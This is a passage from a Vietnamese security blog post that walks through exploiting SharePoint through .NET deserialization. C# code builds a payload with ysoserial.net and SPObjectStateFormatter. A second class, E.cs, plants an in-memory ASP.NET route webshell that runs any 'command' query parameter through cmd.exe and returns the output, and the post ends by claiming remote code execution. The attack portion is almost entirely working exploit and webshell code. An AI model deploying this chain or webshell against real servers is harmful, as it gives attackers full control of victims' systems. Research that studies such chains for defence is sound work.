+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=k>static</span> <span class=n>void</span> <span class=n>Main</span><span class=p>(</span><span class=n>string</span><span class=p>[]</span> <span class=n>args</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=n>spformatter</span> <span class=o>=</span> <span class=n>Activator</span><span class=o>.</span><span class=n>CreateInstance</span><span class=p>(</span><span class=s2>&#34;Microsoft.SharePoint, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c&#34;</span><span class=p>,</span> <span class=s2>&#34;Microsoft.SharePoint.WebPartPages.SPObjectStateFormatter&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>Unwrap</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>MethodInfo</span> <span class=n>SPSerializer</span> <span class=o>=</span> <span class=n>spformatter</span><span class=o>.</span><span class=n>GetType</span><span class=p>()</span><span class=o>.</span><span class=n>GetMethod</span><span class=p>(</span><span class=s2>&#34;Serialize&#34;</span><span class=p>,</span> <span class=n>new</span> <span class=n>Type</span><span class=p>[]</span> <span class=p>{</span> <span class=nb>typeof</span><span class=p>(</span><span class=n>object</span><span class=p>)</span> <span class=p>});</span>
+</span></span><span class=line><span class=cl>    <span class=n>Process</span><span class=o>.</span><span class=n>Start</span><span class=p>(</span><span class=err>@</span><span class=s2>&#34;C:\Windows\Microsoft.NET\Framework64</span><span class=se>\v</span><span class=s2>4.0.30319\csc.exe&#34;</span><span class=p>,</span> <span class=err>@</span><span class=s2>&#34;/target:library /out:ysoserial-net\E.dll ysoserial-net\E.cs&#34;</span><span class=p>)</span><span class=err>?</span><span class=o>.</span><span class=n>WaitForExit</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=n>psi</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ProcessStartInfo</span><span class=p>(</span><span class=err>@</span><span class=s2>&#34;ysoserial.exe&#34;</span><span class=p>,</span> <span class=err>@</span><span class=s2>&#34;-f BinaryFormatter -g ActivitySurrogateSelector -c &#34;&#34;1337&#34;&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>RedirectStandardOutput</span> <span class=o>=</span> <span class=bp>true</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=n>UseShellExecute</span> <span class=o>=</span> <span class=bp>false</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=n>CreateNoWindow</span> <span class=o>=</span> <span class=bp>true</span>
+</span></span><span class=line><span class=cl>    <span class=p>};</span>
+</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=n>p</span> <span class=o>=</span> <span class=n>Process</span><span class=o>.</span><span class=n>Start</span><span class=p>(</span><span class=n>psi</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>string</span> <span class=n>payload</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>StandardOutput</span><span class=o>.</span><span class=n>ReadToEnd</span><span class=p>()</span><span class=o>.</span><span class=n>Trim</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>WaitForExit</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=o>//</span><span class=n>Console</span><span class=o>.</span><span class=n>WriteLine</span><span class=p>(</span><span class=n>payload</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>byte</span><span class=p>[]</span> <span class=n>bytes</span> <span class=o>=</span> <span class=n>Convert</span><span class=o>.</span><span class=n>FromBase64String</span><span class=p>(</span><span class=n>payload</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>DataSetMarshalMod</span> <span class=n>marshal</span> <span class=o>=</span> <span class=n>new</span> <span class=n>DataSetMarshalMod</span><span class=p>(</span><span class=n>bytes</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>ArrayList</span> <span class=n>myAl</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ArrayList</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>myAl</span><span class=o>.</span><span class=n>Add</span><span class=p>(</span><span class=n>marshal</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>object</span><span class=p>[]</span> <span class=n>parametersArray</span> <span class=o>=</span> <span class=n>new</span> <span class=n>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>myAl</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>    <span class=n>string</span> <span class=n>result</span> <span class=o>=</span> <span class=p>(</span><span class=n>string</span><span class=p>)</span><span class=n>SPSerializer</span><span class=o>.</span><span class=n>Invoke</span><span class=p>(</span><span class=n>spformatter</span><span class=p>,</span> <span class=n>parametersArray</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=ne>File</span><span class=o>.</span><span class=n>WriteAllText</span><span class=p>(</span><span class=s2>&#34;objstate.txt&#34;</span><span class=p>,</span> <span class=n>result</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>Console</span><span class=o>.</span><span class=n>WriteLine</span><span class=p>(</span><span class=n>result</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Gen thành payload và send request, response có chứa cookie và header mình set:<br><img src=https://hackmd.io/_uploads/SyS7Lj1B-e.png loading=lazy alt=image><br>Sửa code file E.cs thành code deploy memshell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>class E {
+</span></span><span class=line><span class=cl>    public class MyRouteBase : RouteBase
+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        public override RouteData GetRouteData(HttpContextBase httpContext)
+</span></span><span class=line><span class=cl>        {
+</span></span><span class=line><span class=cl>            String cmd = httpContext.Request.QueryString[&#34;command&#34;]; 
+</span></span><span class=line><span class=cl>            if (cmd != null)
+</span></span><span class=line><span class=cl>            {
+</span></span><span class=line><span class=cl>                HttpResponseBase response = httpContext.Response;
+</span></span><span class=line><span class=cl>                Process p = new Process();
+</span></span><span class=line><span class=cl>                p.StartInfo.FileName = &#34;cmd.exe&#34;;
+</span></span><span class=line><span class=cl>                p.StartInfo.Arguments = &#34;/c&#34; + cmd;
+</span></span><span class=line><span class=cl>                p.StartInfo.UseShellExecute = false;
+</span></span><span class=line><span class=cl>                p.StartInfo.RedirectStandardOutput = true;
+</span></span><span class=line><span class=cl>                p.StartInfo.RedirectStandardError = true;
+</span></span><span class=line><span class=cl>                p.Start();
+</span></span><span class=line><span class=cl>                byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
+</span></span><span class=line><span class=cl>                response.Write(System.Text.Encoding.Default.GetString(data));
+</span></span><span class=line><span class=cl>            }
+</span></span><span class=line><span class=cl>            return null;
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values)
+</span></span><span class=line><span class=cl>        {
+</span></span><span class=line><span class=cl>            return null;
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    public E(){
+</span></span><span class=line><span class=cl>        RouteCollection routeCollection = RouteTable.Routes;
+</span></span><span class=line><span class=cl>        routeCollection.Insert(0, new MyRouteBase());
+</span></span><span class=line><span class=cl>        HttpContext.Current.Response.AddHeader(&#34;Custom-Header&#34;, &#34;Route Memshell Injected!!!!!!!!&#34;);
+</span></span><span class=line><span class=cl>        HttpContext.Current.Response.End();
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p>Xuất hiện header Custom-Header trong response, chứng tỏ C# code đã được load:<br><img src=https://hackmd.io/_uploads/HJytUs1HZl.png loading=lazy alt=image><br>RCE thôi:<br><img src=https://hackmd.io/_uploads/HynF8oyBZl.png loading=lazy alt=image><br></p></section><footer class=article-footer><section class=article-tags><a href=/tags/dotnet/>DotNet</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2026 kev1n's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
